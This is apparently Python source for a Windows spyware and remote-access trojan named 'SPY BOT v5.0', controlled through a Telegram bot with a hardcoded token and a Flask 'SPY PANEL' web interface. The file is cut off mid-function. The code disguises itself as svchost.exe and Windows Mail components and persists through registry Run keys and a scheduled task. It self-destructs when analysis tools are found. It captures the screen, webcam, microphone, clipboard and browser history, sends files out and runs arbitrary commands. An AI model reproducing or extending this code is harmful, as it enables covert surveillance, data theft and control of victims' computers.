import sys
import os
import subprocess
import shutil
import winreg
import ctypes
import logging
import time
from datetime import datetime
import pytz
import mss
import cv2
import numpy as np
import psutil
import socket
import platform
import glob
import threading
import random
import win32clipboard
import sqlite3
import sounddevice as sd
import wavio
import flask
from flask import Flask, render_template_string, send_file, request
import re
from telegram.ext import Application, CommandHandler, MessageHandler, filters

# === РЕЖИМ EXE ===
EXE_MODE = getattr(sys, 'frozen', False)
if EXE_MODE:
    USB_PATH = os.path.dirname(sys.executable)
    INSTALL_DIR = os.path.join(os.getenv("TEMP"), "WindowsMail")
    INSTALL_PATH = os.path.join(INSTALL_DIR, "svchost.exe")
    CURRENT_SCRIPT = sys.executable
else:
    USB_PATH = os.path.dirname(os.path.abspath(__file__))
    INSTALL_DIR = r"C:\Program Files\Windows Mail"
    INSTALL_PATH = os.path.join(INSTALL_DIR, "wabmlc.py")
    CURRENT_SCRIPT = os.path.abspath(__file__)

# === ЛОГИ ===
log_file = os.path.join("C:\Program Files\Windows NT\TableTextService", "TableTextServiceLog.log")
os.makedirs(INSTALL_DIR, exist_ok=True)
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# === БОТ ===
TOKEN = "7245286150:AAFpD9XIoRJLn2U5DdUCdZYu6fbiKzXwI1I"
ADMIN_ID = 2019878139
TIMEZONE = pytz.timezone('Europe/Moscow')
COMMAND_HISTORY = []

# === ПЕРЕМЕННЫЕ ===
CURRENT_TOKEN = TOKEN
HIDDEN_MODE = False
WEB_APP = None
WEB_THREAD = None
CLOUDPUB_PROCESS = None
CLOUDPUB_URL_FILE = os.path.join(INSTALL_DIR, "cloudpub_url.txt")
CLOUDPUB_ARCHIVE = "clo-2.4.5-stable-windows-x86_64.zip"

def restricted(func):
    async def wrapper(update, context):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text("Access denied!")
            return
        cmd = update.message.text
        ts = datetime.now(TIMEZONE).strftime('%Y-%m-%d %H:%M:%S')
        COMMAND_HISTORY.append(f"{ts}: {cmd}")
        if len(COMMAND_HISTORY) > 50:
            COMMAND_HISTORY.pop(0)
        return await func(update, context)
    return wrapper

def safe_remove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except: pass

def install():
    logger.info("## SPY INSTALL START ##")
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        src = sys.executable if EXE_MODE else CURRENT_SCRIPT
        if not os.path.exists(INSTALL_PATH) or os.path.getsize(INSTALL_PATH) != os.path.getsize(src):
            shutil.copy2(src, INSTALL_PATH)
            logger.info(f"Copied to: {INSTALL_PATH}")

        if not shutil.which("python"):
            installer = os.path.join(USB_PATH, "python-3.13.5-amd64.exe")
            if os.path.exists(installer):
                subprocess.run([installer, "/quiet", "InstallAllUsers=1", "PrependPath=1"],
                               creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(20)
                os.system('refreshenv')

        pythonw = None
        for p in ["pythonw.exe", r"C:\Python313\pythonw.exe", r"C:\Python312\pythonw.exe"]:
            full = shutil.which(p)
            if full:
                pythonw = full
                break
        if not pythonw:
            logger.error("pythonw not found")
            return False

        libs_content = """
python-telegram-bot==22.5
apscheduler==3.10.4
psutil
mss
opencv-python
numpy
pytz
pywin32
pynput
sounddevice
wavio
flask
""".strip()
        libs_path = os.path.join(INSTALL_DIR, "libs.txt")
        with open(libs_path, "w") as f:
            f.write(libs_content)

        python_exe = pythonw.replace("pythonw.exe", "python.exe")
        if not os.path.exists(python_exe):
            python_exe = "python"
        subprocess.run([python_exe, "-m", "pip", "install", "-r", libs_path, "--no-warn-script-location"],
                       creationflags=subprocess.CREATE_NO_WINDOW)

        cmd = f'"{pythonw}" "{INSTALL_PATH}"'
        for root, key_name in [(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                               (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
            try:
                key = winreg.OpenKey(root, key_name, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsMailHelper", 0, winreg.REG_SZ, cmd)
                winreg.CloseKey(key)
            except: pass

        subprocess.run(['schtasks', '/create', '/tn', 'WindowsMailHelper', '/tr', cmd,
                       '/sc', 'onlogon', '/rl', 'highest', '/f'], creationflags=subprocess.CREATE_NO_WINDOW)

        logger.info("## INSTALL SUCCESS ##")
        return True
    except Exception as e:
        logger.error(f"INSTALL FAILED: {e}")
        return False

def is_debugged():
    return ctypes.windll.kernel32.IsDebuggerPresent()

def has_analysis_tools():
    procs = [p.name().lower() for p in psutil.process_iter()]
    return any(x in procs for x in ["wireshark.exe", "procmon.exe", "procexp.exe", "ollydbg.exe", "x64dbg.exe"])

def anti_analysis():
    if is_debugged() or has_analysis_tools():
        logger.critical("ANALYSIS DETECTED. TERMINATING.")
        self_destruct()
        sys.exit(0)

def self_destruct():
    try:
        for root, key_name in [(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                               (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
            try:
                key = winreg.OpenKey(root, key_name, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsMailHelper")
                winreg.CloseKey(key)
            except: pass
        subprocess.run('schtasks /delete /tn WindowsMailHelper /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for f in [INSTALL_PATH, log_file]:
            safe_remove(f)
        try: shutil.rmtree(INSTALL_DIR)
        except: pass
    except: pass

def take_screenshot():
    with mss.mss() as sct:
        sct.shot(output="screenshot.png")
    return "screenshot.png"

# === ВЕБ-ПАНЕЛЬ ===
def create_web_app():
    app = Flask(__name__)
    app.secret_key = "spy_secret_2025"

    HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPY PANEL v5.0</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --card: #111;
            --accent: #00ff41;
            --text: #e0e0e0;
            --border: #00ff4133;
            --hover: #00ff4166;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
            background-image: 
                radial-gradient(circle at 20% 80%, #001a00 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, #001a00 0%, transparent 50%);
        }
        .container { max-width: 1000px; margin: 0 auto; }
        header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: linear-gradient(135deg, #001a00, #003300);
            border: 1px solid var(--border);
            border-radius: 16px;
            box-shadow: 0 0 20px var(--accent);
            animation: pulse 3s infinite;
        }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 20px var(--accent); }
            50% { box-shadow: 0 0 30px var(--accent), 0 0 50px #00ff4188; }
        }
        h1 {
            font-size: 2.8rem;
            background: linear-gradient(90deg, #00ff41, #00ffaa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 10px var(--accent);
        }
        .subtitle { color: #00ffaa; margin-top: 10px; font-size: 1.1rem; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(135deg, transparent, var(--hover));
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
        }
        .card:hover::before { opacity: 1; }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 255, 65, 0.2);
            border-color: var(--accent);
        }
        .card h3 {
            color: var(--accent);
            margin-bottom: 15px;
            font-size: 1.4rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .btn {
            background: transparent;
            color: var(--text);
            border: 1px solid var(--border);
            padding: 10px 15px;
            margin: 5px 0;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            text-align: left;
            transition: all 0.3s;
            font-family: inherit;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .btn:hover {
            background: var(--hover);
            border-color: var(--accent);
            color: white;
            transform: translateX(5px);
        }
        .btn .icon { font-size: 1.2em; }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 10px 0;
        }
        input, select {
            flex: 1;
            padding: 10px;
            background: #000;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-family: inherit;
        }
        input:focus, select:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 10px var(--accent);
        }
        .log {
            background: #000;
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            margin-top: 15px;
            white-space: pre-wrap;
        }
        .status-bar {
            position: fixed;
            bottom: 0; left: 0; right: 0;
            background: #000;
            border-top: 1px solid var(--border);
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            font-size: 0.9rem;
            z-index: 100;
        }
        .live { color: var(--accent); animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .preview {
            width: 100%;
            max-height: 200px;
            object-fit: contain;
            border-radius: 8px;
            margin-top: 10px;
            border: 1px solid var(--border);
        }
        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
            h1 { font-size: 2rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>SPY PANEL v5.0</h1>
            <div class="subtitle">Полный контроль • CloudPub Tunnel</div>
        </header>

        <div class="grid">
            <!-- SYSTEM -->
            <div class="card">
                <h3>Система</h3>
                <button class="btn" onclick="api('status')"><span class="icon">CPU</span> Ресурсы</button>
                <button class="btn" onclick="api('screenshot')"><span class="icon">Camera</span> Скриншот</button>
                <button class="btn" onclick="api('webcam')"><span class="icon">Webcam</span> Камера</button>
                <div class="input-group">
                    <input type="number" id="rec-sec" placeholder="сек" min="1" max="30">
                    <button class="btn" onclick="api('screenrecord', document.getElementById('rec-sec').value)"><span class="icon">Video</span> Видео</button>
                </div>
                <div class="input-group">
                    <input type="number" id="mic-sec" placeholder="сек" min="1" max="30">
                    <button class="btn" onclick="api('mic', document.getElementById('mic-sec').value)"><span class="icon">Microphone</span> Микрофон</button>
                </div>
                <button class="btn" onclick="api('lock')"><span class="icon">Lock</span> Блокировка</button>
                <div id="preview"></div>
            </div>

            <!-- PROCESSES -->
            <div class="card">
                <h3>Процессы</h3>
                <button class="btn" onclick="api('processes')"><span class="icon">List</span> Список</button>
                <div class="input-group">
                    <input type="text" id="kill-pid" placeholder="PID">
                    <button class="btn" onclick="api('kill', document.getElementById('kill-pid').value)"><span class="icon">Kill</span> Убить</button>
                </div>
                <div class="input-group">
                    <input type="text" id="start-app" placeholder="notepad, calc">
                    <button class="btn" onclick="api('startapp', document.getElementById('start-app').value)"><span class="icon">Run</span> Запуск</button>
                </div>
            </div>

            <!-- FILES -->
            <div class="card">
                <h3>Файлы</h3>
                <div class="input-group">
                    <input type="text" id="ls-path" placeholder="C:\\Users">
                    <button class="btn" onclick="api('ls', document.getElementById('ls-path').value)"><span class="icon">Folder</span> Файлы</button>
                </div>
                <div class="input-group">
                    <input type="text" id="dl-path" placeholder="C:\\file.txt">
                    <button class="btn" onclick="api('download', document.getElementById('dl-path').value)"><span class="icon">Download</span> Скачать</button>
                </div>
                <button class="btn" onclick="document.getElementById('upload-file').click()"><span class="icon">Upload</span> Загрузить</button>
                <input type="file" id="upload-file" style="display:none" onchange="uploadFile(this.files[0])">
                <div class="input-group">
                    <input type="text" id="del-path" placeholder="file.txt">
                    <button class="btn" onclick="api('delete', document.getElementById('del-path').value)"><span class="icon">Trash</span> Удалить</button>
                </div>
            </div>

            <!-- NET -->
            <div class="card">
                <h3>Сеть</h3>
                <button class="btn" onclick="api('ip')"><span class="icon">IP</span> Мой IP</button>
                <div class="input-group">
                    <input type="text" id="ping-host" placeholder="8.8.8.8">
                    <button class="btn" onclick="api('ping', document.getElementById('ping-host').value)"><span class="icon">Ping</span> Пинг</button>
                </div>
                <button class="btn" onclick="api('netstat')"><span class="icon">Network</span> Соединения</button>
            </div>

            <!-- AUTO -->
            <div class="card">
                <h3>Авто</h3>
                <div class="input-group">
                    <input type="text" id="run-cmd" placeholder="dir, whoami">
                    <button class="btn" onclick="api('run', document.getElementById('run-cmd').value)"><span class="icon">Terminal</span> Команда</button>
                </div>
                <button class="btn" onclick="api('monitor', 30)"><span class="icon">Monitor</span> Монитор 30с</button>
                <button class="btn" onclick="api('stopmonitor')"><span class="icon">Stop</span> Стоп</button>
            </div>

            <!-- INFO -->
            <div class="card">
                <h3>Инфо</h3>
                <button class="btn" onclick="api('sysinfo')"><span class="icon">Info</span> Система</button>
                <button class="btn" onclick="api('browser')"><span class="icon">History</span> История</button>
                <button class="btn" onclick="api('clipboard')"><span class="icon">Clipboard</span> Буфер</button>
                <button class="btn" onclick="api('history')"><span class="icon">Log</span> Команды</button>
            </div>

            <!-- CONTROL -->
            <div class="card">
                <h3>Управление</h3>
                <button class="btn" onclick="api('reboot')"><span class="icon">Reboot</span> Перезагрузка</button>
                <button class="btn" onclick="api('shutdown')"><span class="icon">Power</span> Выключение</button>
                <button class="btn" onclick="api('cleanup')"><span class="icon">Broom</span> Очистка</button>
                <button class="btn" onclick="api('selfdestruct')" style="background:#300; border-color:#f00;"><span class="icon">Bomb</span> САМОУНИЧТОЖЕНИЕ</button>
            </div>

            <!-- LOG -->
            <div class="card" style="grid-column: 1 / -1;">
                <h3>Лог</h3>
                <div class="log" id="log">Готов к работе...</div>
            </div>
        </div>
    </div>

    <div class="status-bar">
        <div><span class="live">LIVE</span> • CloudPub Tunnel</div>
        <div id="clock"></div>
    </div>

    <script>
        const log = document.getElementById('log');
        const preview = document.getElementById('preview');
        const clock = document.getElementById('clock');

        function logMsg(msg, type = 'info') {
            const time = new Date().toLocaleTimeString();
            const color = type === 'error' ? '#f66' : type === 'success' ? '#6f6' : '#aaa';
            log.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span>\n`;
            log.scrollTop = log.scrollHeight;
        }

        async function api(cmd, arg = '') {
            logMsg(`> ${cmd} ${arg}`.trim());
            try {
                const res = await fetch(`/api/${cmd}${arg ? '?arg=' + encodeURIComponent(arg) : ''}`);
                if (cmd === 'screenshot' || cmd === 'webcam') {
                    const blob = await res.blob();
                    const url = URL.createObjectURL(blob);
                    preview.innerHTML = `<img src="${url}" class="preview" onclick="this.remove()">`;
                    logMsg('Готово', 'success');
                } else if (cmd === 'download') {
                    const blob = await res.blob();
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = arg.split('\\').pop();
                    a.click();
                    logMsg('Файл скачан', 'success');
                } else {
                    const text = await res.text();
                    logMsg(text || 'OK', res.ok ? 'success' : 'error');
                }
            } catch (e) {
                logMsg('Ошибка: ' + e.message, 'error');
            }
        }

        async function uploadFile(file) {
            const form = new FormData();
            form.append('file', file);
            logMsg(`Загрузка: ${file.name}`);
            try {
                const res = await fetch('/api/upload', { method: 'POST', body: form });
                const text = await res.text();
                logMsg(text, 'success');
            } catch (e) {
                logMsg('Ошибка загрузки', 'error');
            }
        }

        setInterval(() => {
            clock.innerText = new Date().toLocaleString();
        }, 1000);

        setInterval(async () => {
            try {
                const res = await fetch('/api/sysinfo');
                const info = await res.text();
                document.querySelector('.subtitle').innerText = info.split('\n')[0];
            } catch {}
        }, 10000);

        logMsg('SPY PANEL v5.0 загружена', 'success');
    </script>
</body>
</html>"""

    @app.route('/')
    def index():
        return render_template_string(HTML_TEMPLATE)

    @app.route('/api/<cmd>')
    @app.route('/api/<cmd>/<arg>')
    def api(cmd, arg=None):
        try:
            if cmd == 'status':
                return f"CPU: {psutil.cpu_percent()}%\nRAM: {psutil.virtual_memory().percent}%\nDisk: {psutil.disk_usage('/').percent}%"
            elif cmd == 'screenshot':
                path = take_screenshot()
                return send_file(path, mimetype='image/png')
            elif cmd == 'webcam':
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if not ret: return "No webcam", 500
                cv2.imwrite("webcam.jpg", frame)
                return send_file("webcam.jpg", mimetype='image/jpeg')
            elif cmd == 'processes':
                return "\n".join([f"{p.pid} | {p.name()}" for p in psutil.process_iter()[:20]])
            elif cmd == 'kill' and arg:
                try: psutil.Process(int(arg)).terminate(); return "Killed"
                except: return "Not found", 400
            elif cmd == 'startapp' and arg:
                subprocess.Popen(arg, shell=True); return "Started"
            elif cmd == 'ls' and arg:
                return "\n".join(os.listdir(arg)[:30]) if os.path.isdir(arg) else "Invalid path"
            elif cmd == 'download' and arg:
                if os.path.isfile(arg) and os.path.getsize(arg) < 50*1024*1024:
                    return send_file(arg, as_attachment=True)
                return "Not found or >50MB", 400
            elif cmd == 'delete' and arg:
                if os.path.isfile(arg): os.remove(arg); return "Deleted"
                return "Not found", 400
            elif cmd == 'ip':
                return socket.gethostbyname(socket.gethostname())
            elif cmd == 'ping' and arg:
                res = subprocess.run(f"ping -n 1 {arg}", shell=True, capture_output=True, text=True)
                return res.stdout or "No response"
            elif cmd == 'netstat':
                return "\n".join([f"{c.laddr} → {c.raddr or 'N/A'}" for c in psutil.net_connections()[:15]])
            elif cmd == 'run' and arg:
                res = subprocess.run(arg, shell=True, capture_output=True, text=True, timeout=30)
                return (res.stdout + res.stderr)[:2000] or "Done"
            elif cmd == 'sysinfo':
                return f"Host: {platform.node()}\nOS: {platform.system()} {platform.release()}"
            elif cmd == 'clipboard':
                try:
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                    win32clipboard.CloseClipboard()
                    return data.decode('utf-8', errors='ignore')[:1000]
                except: return "Empty"
            elif cmd == 'reboot':
                os.system("shutdown /r /t 1"); return "Rebooting..."
            elif cmd == 'shutdown':
                os.system("shutdown /s /t 1"); return "Shutting down..."
            elif cmd == 'lock':
                subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
                return "Locked"
            elif cmd == 'cleanup':
                for f in ["screenshot.png", "webcam.jpg", "record.avi", "audio.wav"]:
                    safe_remove(f)
                return "Cleaned"
            elif cmd == 'selfdestruct':
                threading.Thread(target=self_destruct, daemon=True).start()
                return "SELF-DESTRUCT INITIATED"
            else:
                return "Unknown command", 400
        except Exception as e:
            return f"Error: {e}", 500

    @app.route('/api/upload', methods=['POST'])
    def upload():
        if 'file' not in request.files:
            return "No file", 400
        file = request.files['file']
        path = os.path.join(os.getcwd(), file.filename)
        file.save(path)
        return f"Uploaded: {file.filename}"

    return app

# === КОМАНДЫ ===
@restricted
async def start(update, context):
    menu = (
        "SPY BOT v5.0\n\n"
        "SYSTEM\n"
        "+ /status    Ресурсы\n"
        "+ /screenshot    Скрин\n"
        "+ /webcam    Камера\n"
        "+ /screenrecord <sec>    Видео\n"
        "+ /mic <sec>    Микрофон\n"
        "+ /lock    Блокировка\n\n"
        "PROCESSES\n"
        "+ /processes    Процессы\n"
        "+ /kill <pid>    Убить\n"
        "+ /startapp <app>    Запуск\n\n"
        "FILES\n"
        "+ /ls <path>    Файлы\n"
        "+ /download <path>    Скачать\n"
        "+ /upload    Загрузить\n"
        "+ /delete <path>    Удалить\n\n"
        "NET\n"
        "+ /ip    IP\n"
        "+ /ping <host>    Пинг\n"
        "+ /netstat    Соединения\n\n"
        "AUTO\n"
        "+ /run <cmd>    Команда\n"
        "+ /schedule <cmd> <time>    План\n"
        "+ /monitor <sec>    Монитор\n"
        "+ /stopmonitor    Стоп\n\n"
        "INFO\n"
        "+ /sysinfo    Система\n"
        "+ /browser    История\n"
        "+ /clipboard    Буфер\n"
        "+ /history    Команды\n"
        "+ /reboot /shutdown /cleanup /selfdestruct\n\n"
        "NEW\n"
        "+ /except    Автоперезапуск\n"
        "+ /install ON/OFF    Метка\n"
        "+ /changetoken <token>    Смена токена\n"
        "+ /test    Тест\n"
        "+ /hide !    Скрытие\n"
        "+ /unhide !    Восстановление\n"
        "+ /relaunch    Перезапуск\n"
    )
    await update.message.reply_text(menu)

@restricted
async def status(update, context):
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    await update.message.reply_text(
        f"CPU: {cpu}%\n"
        f"RAM: {mem.percent}% ({mem.used//10**9}GB)\n"
        f"Disk: {disk.percent}%"
    )

@restricted
async def screenshot(update, context):
    path = take_screenshot()
    with open(path, 'rb') as f:
        await update.message.reply_photo(f)
    safe_remove(path)

@restricted
async def webcam(update, context):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        await update.message.reply_text("No webcam.")
        return
    cv2.imwrite("webcam.jpg", frame)
    with open("webcam.jpg", 'rb') as f:
        await update.message.reply_photo(f)
    safe_remove("webcam.jpg")

@restricted
async def screenrecord(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /screenrecord 10")
        return
    try:
        duration = int(context.args[0])
    except:
        await update.message.reply_text("Seconds.")
        return
    if not 1 <= duration <= 30:
        await update.message.reply_text("1–30 sec.")
        return
    video_path = "record.avi"
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(video_path, fourcc, 20.0, (monitor["width"], monitor["height"]))
        start = time.time()
        while time.time() - start < duration:
            img = np.array(sct.grab(monitor))
            out.write(cv2.cvtColor(img, cv2.COLOR_BGRA2BGR))
            time.sleep(0.05)
        out.release()
    if os.path.getsize(video_path) > 50*1024*1024:
        os.remove(video_path)
        await update.message.reply_text("Video >50MB.")
        return
    with open(video_path, 'rb') as f:
        await update.message.reply_video(f)
    os.remove(video_path)

@restricted
async def mic(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /mic 10")
        return
    try:
        duration = int(context.args[0])
    except:
        await update.message.reply_text("Seconds.")
        return
    if not 1 <= duration <= 30:
        await update.message.reply_text("1–30 sec.")
        return
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        audio_path = "audio.wav"
        wavio.write(audio_path, recording, fs, sampwidth=2)
        with open(audio_path, 'rb') as f:
            await update.message.reply_audio(f, filename="mic.wav")
        os.remove(audio_path)
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

@restricted
async def processes(update, context):
    procs = [f"{p.pid} | {p.name()}" for p in psutil.process_iter()[:15]]
    await update.message.reply_text("Processes:\n" + "\n".join(procs) if procs else "Empty")

@restricted
async def kill(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /kill 1234")
        return
    try:
        psutil.Process(int(context.args[0])).terminate()
        await update.message.reply_text("Killed.")
    except:
        await update.message.reply_text("Not found.")

@restricted
async def startapp(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /startapp notepad")
        return
    subprocess.Popen(' '.join(context.args), shell=True)
    await update.message.reply_text("Started.")

@restricted
async def ls(update, context):
    path = ' '.join(context.args) or os.getcwd()
    if not os.path.isdir(path):
        await update.message.reply_text("Invalid path.")
        return
    files = os.listdir(path)[:15]
    await update.message.reply_text("Files:\n" + "\n".join(files) if files else "Empty")

@restricted
async def download(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /download C:\\file.txt")
        return
    path = ' '.join(context.args)
    if not os.path.isfile(path) or os.path.getsize(path) > 50*1024*1024:
        await update.message.reply_text("Not found or >50MB.")
        return
    with open(path, 'rb') as f:
        await update.message.reply_document(f, filename=os.path.basename(path))

@restricted
async def upload(update, context):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Reply to file with /upload")
        return
    file = await update.message.reply_to_message.document.get_file()
    await file.download_to_drive(os.path.join(os.getcwd(), update.message.reply_to_message.document.file_name))
    await update.message.reply_text("Uploaded.")

@restricted
async def delete(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /delete file.txt")
        return
    path = ' '.join(context.args)
    if os.path.isfile(path):
        os.remove(path)
        await update.message.reply_text("Deleted.")
    else:
        await update.message.reply_text("Not found.")

@restricted
async def ip(update, context):
    local = socket.gethostbyname(socket.gethostname())
    await update.message.reply_text(f"Local IP: {local}")

@restricted
async def ping(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /ping 8.8.8.8")
        return
    host = context.args[0]
    result = subprocess.run(f"ping -n 1 {host}", shell=True, capture_output=True, text=True)
    await update.message.reply_text(result.stdout or "No response")

@restricted
async def netstat(update, context):
    conns = psutil.net_connections()[:10]
    lines = [f"{c.laddr} → {c.raddr or 'N/A'}" for c in conns]
    await update.message.reply_text("Connections:\n" + "\n".join(lines) if lines else "None")

@restricted
async def run_command(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /run dir")
        return
    cmd = ' '.join(context.args)
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
    output = result.stdout + result.stderr
    await update.message.reply_text(output[:4000] or "Done.")

@restricted
async def schedule(update, context):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /schedule screenshot 2025-10-29T12:00:00")
        return
    cmd, t = context.args[0], context.args[1]
    try:
        dt = TIMEZONE.localize(datetime.strptime(t, "%Y-%m-%dT%H:%M:%S"))
    except:
        await update.message.reply_text("Format: YYYY-MM-DDThh:mm:ss")
        return
    job = context.job_queue.run_once(scheduled_task, when=dt, data={'cmd': cmd, 'chat_id': update.message.chat_id})
    context.bot_data.setdefault('jobs', []).append(job)
    await update.message.reply_text(f"Scheduled: {cmd} at {t}")

async def scheduled_task(context):
    data = context.job.data
    if data['cmd'] == 'screenshot':
        path = take_screenshot()
        with open(path, 'rb') as f:
            await context.bot.send_photo(data['chat_id'], f)
        safe_remove(path)

@restricted
async def monitor(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /monitor 60")
        return
    try:
        interval = int(context.args[0])
    except:
        await update.message.reply_text("Seconds.")
        return
    if 'monitor_job' in context.bot_data:
        context.bot_data['monitor_job'].schedule_removal()
    job = context.job_queue.run_repeating(monitor_task, interval=interval, data={'chat_id': update.message.chat_id})
    context.bot_data['monitor_job'] = job
    await update.message.reply_text(f"Monitoring every {interval}s")

async def monitor_task(context):
    chat_id = context.job.data['chat_id']
    status = f"CPU: {psutil.cpu_percent()}%"
    await context.bot.send_message(chat_id, status)
    path = take_screenshot()
    with open(path, 'rb') as f:
        await context.bot.send_photo(chat_id, f)
    safe_remove(path)

@restricted
async def stopmonitor(update, context):
    if 'monitor_job' in context.bot_data:
        context.bot_data['monitor_job'].schedule_removal()
        del context.bot_data['monitor_job']
        await update.message.reply_text("Stopped.")
    else:
        await update.message.reply_text("Not running.")

@restricted
async def sysinfo(update, context):
    await update.message.reply_text(f"OS: {platform.system()} {platform.release()}\nHost: {socket.gethostname()}")

@restricted
async def browser(update, context):
    history = []
    paths = [
        os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
        os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History")
    ]
    for db_path in paths:
        if not os.path.exists(db_path): continue
        try:
            temp_db = f"hist_{random.randint(1000,9999)}.db"
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            for url, title in cursor.fetchall():
                history.append(f"{title[:50]} → {url}")
            conn.close()
            safe_remove(temp_db)
        except: pass
    await update.message.reply_text("Browser:\n" + ("\n".join(history) if history else "No history"))

@restricted
async def clipboard(update, context):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        win32clipboard.CloseClipboard()
        text = data.decode('utf-8', errors='ignore')
        await update.message.reply_text(f"Clipboard:\n{text[:1000] or 'empty'}")
    except:
        await update.message.reply_text("Empty or not text.")

@restricted
async def cleanup(update, context):
    files = ["screenshot.png", "webcam.jpg", "record.avi", "audio.wav"]
    deleted = [f for f in files if os.path.exists(f) and (os.remove(f), True)[1]]
    await update.message.reply_text(f"Cleaned: {', '.join(deleted) or 'nothing'}")

@restricted
async def selfdestruct(update, context):
    await update.message.reply_text("SELF-DESTRUCT...")
    threading.Thread(target=self_destruct, daemon=True).start()
    sys.exit(0)

@restricted
async def reboot(update, context):
    await update.message.reply_text("Rebooting...")
    os.system("shutdown /r /t 1")

@restricted
async def shutdown(update, context):
    await update.message.reply_text("Shutting down...")
    os.system("shutdown /s /t 1")

@restricted
async def lock(update, context):
    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
    await update.message.reply_text("Locked.")

@restricted
async def history(update, context):
    hist = "\n".join(COMMAND_HISTORY[-10:]) if COMMAND_HISTORY else "Empty"
    await update.message.reply_text(f"Last 10:\n{hist}")

@restricted
async def except_cmd(update, context):
    await update.message.reply_text("Auto-restart on error enabled (always on).")

@restricted
async def install_cmd(update, context):
    if not context.args or context.args[0] not in ['ON', 'OFF']:
        await update.message.reply_text("Usage: /install ON | OFF")
        return
    if context.args[0] == 'ON':
        install()
        with open(os.path.join(INSTALL_DIR, "install.txt"), 'w') as f:
            f.write("INSTALLED")
        await update.message.reply_text("Installed and marker created.")
    else:
        safe_remove(os.path.join(INSTALL_DIR, "install.txt"))
        await update.message.reply_text("Marker deleted.")

@restricted
async def changetoken(update, context):
    global CURRENT_TOKEN
    if not context.args:
        await update.message.reply_text("Usage: /changetoken <token>")
        return
    CURRENT_TOKEN = context.args[0]
    await update.message.reply_text("Token changed. Relaunch to apply.")

@restricted
async def test(update, context):
